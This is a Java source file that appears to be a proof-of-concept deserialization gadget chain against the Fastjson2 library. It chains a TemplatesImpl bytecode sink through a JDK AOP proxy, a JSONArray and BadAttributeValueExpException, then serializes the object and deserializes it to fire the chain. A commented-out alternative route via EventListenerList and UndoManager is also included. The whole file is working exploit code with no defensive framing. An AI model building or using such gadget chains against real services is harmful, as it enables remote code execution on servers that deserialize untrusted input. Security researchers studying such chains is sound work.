package com.example;

import com.alibaba.fastjson2.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.example.Utils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Proxy;
import java.util.ArrayList;

import static com.example.Module_JdkAopProxy.getBProxy;

public class Fastjson2Chain {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = Utils.getTemplatesImpl();
        Proxy proxy = (Proxy) getBProxy(templates, new Class[]{Templates.class});
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(proxy);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Utils.SetValue(badAttributeValueExpException, "val", jsonArray);
        ArrayList list = new ArrayList();
        list.add(proxy);
        list.add(badAttributeValueExpException);

//        EventListenerList eventListenerList = new EventListenerList();
//        UndoManager undoManager = new UndoManager();
//        Vector vector = (Vector) Utils.getFieldValue(undoManager, "edits");
//        vector.add(jsonArray);
//        Utils.SetValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
//
//        HashMap hashMap = new HashMap();
//        hashMap.put(proxy,eventListenerList);

        String exp = Utils.Serialize(list);
        System.out.println(exp);
        Utils.UnSerialize(exp);
    }
}